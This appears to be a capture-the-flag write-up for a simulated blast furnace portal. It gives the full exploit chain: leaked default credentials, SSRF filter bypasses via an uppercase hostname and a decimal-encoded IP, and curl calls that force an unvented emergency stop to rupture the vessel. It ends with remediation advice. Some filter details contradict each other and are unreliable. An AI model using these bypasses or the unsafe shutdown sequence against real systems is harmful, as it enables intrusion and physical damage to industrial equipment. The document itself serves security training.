# OT#003 — Blast Furnace Remote Operations Portal

**Challenge**: OT#003  
**Remote**: `<HOST>:<PORT>`  
**Category**: Web / OT / SSRF  
**Flag**: `CTF{REDACTED}`

---

## Challenge Overview

A blast furnace remote operations portal exposed to the corporate network. The furnace control system itself is never directly reachable — only this web portal is. The challenge involves:

1. **Credential leakage** via public files
2. **SSRF filter bypass** via case-sensitivity and IP encoding
3. **Vessel rupture** by triggering an uncontrolled shutdown

---

## 1. Credentials Disclosure

### Endpoint: GET `/commissioning-notes.txt`

The public commissioning notes expose default operator credentials:

```
operator / St33lW0rks!2024
```

These credentials are later used to authenticate SSRF requests.

---

## 2. SSRF Filter Bypass

### Vulnerability: Overly Restrictive Filtering

The sensor integration endpoint (`POST /ops/test-sensor`) blocks private IPv4 ranges and hostname:

**Blocked patterns** (case-sensitive):
- `127.*` (localhost loopback)
- `10.*` (private network)
- `172.*` (private network)
- `192.168.*` (private network)
- `localhost` (lowercase exact match)

**Bypass techniques**:

#### Method 1: Uppercase Hostname
```
http://FURNACE:4000/
```
The filter checks for lowercase `furnace`; uppercase bypasses it.

#### Method 2: Decimal/Hex IP Encoding
For IP `172.25.0.2:4000`:
- Standard: `http://172.25.0.2:4000/` → **blocked** (matches `172.*`)
- Decimal: `http://2887770626:4000/` (172*256³ + 25*256² + 0*256 + 2)
- The filter only checks the dotted format, not numeric representations

#### Implementation
Both the portal **and** the furnace control system accept this request due to URI parsing differences.

---

## 3. Furnace Status & Venting

### Endpoint: GET `/status` (via SSRF)

```bash
curl -H "X-Session-Id: <sid>" 'http://furnace:4000/status'
```

Response:
```json
{
  "temperature": 1550,
  "pressure": 92,
  "vented": false,
  "ruptured": false
}
```

**Critical parameters**:
- `temperature`: 1550°C (high, approaching critical)
- `pressure`: 92 PSI (high)
- `vented`: false (pressure relief not activated)
- `ruptured`: false (vessel intact)

### Endpoint: POST `/vent`

Safely vents pressure before emergency shutdown:

```bash
curl -X POST -H "X-Session-Id: <sid>" 'http://furnace:4000/vent'
```

Response: `{"vented": true}`

Post-vent status:
```json
{
  "temperature": 1550,
  "pressure": 35,      // ← pressure drops safely
  "vented": true,
  "ruptured": false
}
```

---

## 4. Vessel Rupture via Uncontrolled Emergency Stop

### Endpoint: POST `/emergency_stop`

The emergency stop behavior **depends on venting state**:

#### Scenario A: Safe Shutdown (after venting)
```bash
curl -X POST -H "X-Session-Id: <sid>" 'http://furnace:4000/vent'
curl -X POST -H "X-Session-Id: <sid>" 'http://furnace:4000/emergency_stop'
```

Response: `"Furnace stopped safely."`

Status: `ruptured: false`

#### Scenario B: Uncontrolled Shutdown (without venting)
```bash
curl -X POST -H "X-Session-Id: <sid>" 'http://furnace:4000/emergency_stop'
```

Response: `"Uncontrolled shutdown with pressure still high: vessel ruptured."`

Status: `ruptured: true` ← **Flag exposed**

**Physics**: Shutting down without venting causes the pressure system to fail catastrophically. The rupture event triggers access to the flag.

---

## 5. Flag Extraction

### Endpoint: GET `/status` (after rupture)

Once the vessel is ruptured, the flag is included in the status response:

```bash
curl -H "X-Session-Id: <sid>" 'http://furnace:4000/status'
```

Response (after rupture):
```json
{
  "temperature": 1550,
  "pressure": 92,
  "vented": false,
  "ruptured": true,
  "flag": "CTF{...}"
}
```

---

## 6. Full Exploitation Chain

```
1. GET /commissioning-notes.txt
   → Leak credentials: operator / St33lW0rks!2024

2. POST /login
   → Authenticate, obtain X-Session-Id

3. POST /ops/test-sensor (SSRF bypass)
   → Use http://FURNACE:4000/ or decimal IP
   → Furnace control is now accessible

4. GET http://furnace:4000/status
   → Verify furnace state (temp, pressure, vented, ruptured)

5. POST http://furnace:4000/emergency_stop (NO VENTING)
   → Trigger uncontrolled shutdown
   → Response: "Uncontrolled shutdown with pressure still high: vessel ruptured."

6. GET http://furnace:4000/status
   → Extract flag from ruptured: true response

Result: CTF{...}
```

---

## 7. Key Insights

- **Filter Weakness**: Case-sensitive hostname check (`furnace` vs `FURNACE`)
- **IP Encoding**: Decimal/hex IP representations bypass pattern matching
- **Session Propagation**: The SSRF request includes operator credentials (X-Session-Id header)
- **Logic Flaw**: The furnace accepts emergency_stop without pressure venting, leading to rupture
- **Flag Gating**: Rupture state unlocks the flag in the status endpoint

---

## 8. Remediation

1. **SSRF Filtering**: Use allowlist approach (exact match, all IP encodings)
2. **Case-insensitive Checks**: Normalize hostnames to lowercase before filtering
3. **Credential Hardening**: Rotate default credentials, remove from public files
4. **Session Isolation**: Restrict session tokens to specific operations; don't propagate to external systems
5. **Safe State Enforcement**: Require pressure venting before emergency shutdown; validate furnace logic
